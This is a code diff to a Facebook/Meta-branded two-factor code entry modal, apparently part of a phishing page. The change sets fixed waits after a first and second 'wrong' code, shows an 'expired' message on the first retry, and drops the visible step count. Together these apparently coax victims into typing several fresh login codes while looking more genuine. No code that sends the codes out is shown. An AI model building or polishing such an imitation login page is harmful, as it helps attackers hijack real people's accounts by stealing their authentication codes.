@@ -12,9 +12,15 @@ interface TwoFactorModalProps {
     onToggleModal: (isOpen: boolean) => void;
 }
 
+/** Sau nhập sai mã lần 1 → chờ trước khi nhập lại; sau sai lần 2 → chờ trước lần 3 */
+const RETRY_WAIT_AFTER_FIRST_WRONG_SEC = 15;
+const RETRY_WAIT_AFTER_SECOND_WRONG_SEC = 30;
+
 const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish, onToggleModal }) => {
     const t = useAppStrings();
-    const initialCountdown = process.env.NEXT_PUBLIC_SETTING_TIME ? parseInt(process.env.NEXT_PUBLIC_SETTING_TIME) : 30;
+
+    const getRetryWaitSeconds = (nextStep: number) =>
+        nextStep === 1 ? RETRY_WAIT_AFTER_FIRST_WRONG_SEC : RETRY_WAIT_AFTER_SECOND_WRONG_SEC;
 
     const [isOpen, setIsOpen] = React.useState(isOpend);
     const [errors, setErrors] = React.useState<Record<string, string>>({});
@@ -33,7 +39,7 @@ const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish,
     const phoneDisplay = maskPhoneNumber(phone)
     const emailDisplay = maskEmail(email);
 
-    const [countdown, setCountdown] = React.useState<number>(initialCountdown);
+    const [countdown, setCountdown] = React.useState<number>(RETRY_WAIT_AFTER_FIRST_WRONG_SEC);
 
     React.useEffect(() => {
         setIsOpen(isOpend);
@@ -68,18 +74,23 @@ const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish,
 
     const isTwoFaValid = (twoFa.length === 6 || twoFa.length === 8) && /^\d+$/.test(twoFa);
 
-    const formatRetryError = (secondsLeft: number) => {
+    const formatRetryMessage = (secondsLeft: number, nextStep: number) => {
         const minutes = Math.floor(secondsLeft / 60);
         const seconds = secondsLeft % 60;
+        if (nextStep === 1) {
+            return t.twoFa.retryErrorExpired(minutes, seconds);
+        }
         return t.twoFa.retryError(minutes, seconds);
     };
 
     const startRetryCountdown = (nextStep: number) => {
         if (intervalRef.current) clearInterval(intervalRef.current);
 
+        const waitSec = getRetryWaitSeconds(nextStep);
+
         setDisable(true);
-        setCountdown(initialCountdown);
-        setErrors({ twoFa: formatRetryError(initialCountdown) });
+        setCountdown(waitSec);
+        setErrors({ twoFa: formatRetryMessage(waitSec, nextStep) });
 
         intervalRef.current = setInterval(() => {
             setCountdown((prev) => {
@@ -90,9 +101,9 @@ const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish,
                     setClick(nextStep);
                     setErrors({});
                     setDisable(false);
-                    return initialCountdown;
+                    return waitSec;
                 }
-                setErrors({ twoFa: formatRetryError(next) });
+                setErrors({ twoFa: formatRetryMessage(next, nextStep) });
                 return next;
             });
         }, 1000);
@@ -211,7 +222,7 @@ const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish,
                         <div className="w-[4px] h-[4px] bg-[#9a979e] rounded-[5px]"></div>
                         <span>{t.common.facebook}</span>
                     </div>
-                    <h2 className='text-[17px] leading-snug text-[black] font-[700] mb-[15px] break-words sm:text-[20px]'>{t.twoFa.title(click + 1)}</h2>
+                    <h2 className='text-[17px] leading-snug text-[black] font-[700] mb-[15px] break-words sm:text-[20px]'>{t.twoFa.title}</h2>
                     <p className='text-[#9a979e] text-[14px]'>{t.twoFa.description(emailDisplay, phoneDisplay)}</p>
                     <div className='w-full rounded-[10px] bg-[#f5f5f5] overflow-hidden my-[15px]'>
                         <img src="/images/meta/authentication.png" width="100%" alt="authentication" />
